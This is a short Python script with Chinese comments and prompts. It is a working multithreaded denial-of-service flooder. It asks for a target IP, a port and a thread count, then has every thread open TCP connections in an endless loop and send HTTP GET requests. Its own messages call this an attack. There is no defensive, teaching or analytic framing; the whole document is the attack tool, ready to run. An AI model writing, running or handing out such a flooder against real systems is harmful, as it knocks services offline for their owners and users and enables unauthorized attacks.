import socket
import threading

def tcp_flood(target_ip, target_port):
    try:
        # 创建一个无限循环，用于持续发送数据
        while True:
            # 创建 TCP 套接字
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)  # 设置超时时间
            try:
                # 尝试连接目标
                sock.connect((target_ip, target_port))
                # 发送随机数据
                sock.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
            except Exception as e:
                # 忽略连接错误
                pass
            finally:
                sock.close()
    except KeyboardInterrupt:
        print("\n攻击已停止。")
    except Exception as e:
        print(f"发生错误: {e}")

if __name__ == "__main__":
    # 输入目标 IP 和端口
    target_ip = input("请输入目标 IP 地址: ")
    target_port = int(input("请输入目标端口号: "))
    threads = int(input("请输入线程数: "))

    print(f"开始向 {target_ip}:{target_port} 发送 TCP 数据包...")

    # 创建多线程进行攻击
    for i in range(threads):
        thread = threading.Thread(target=tcp_flood, args=(target_ip, target_port))
        thread.daemon = True  # 主线程退出时子线程自动退出
        thread.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("\n攻击已停止。")
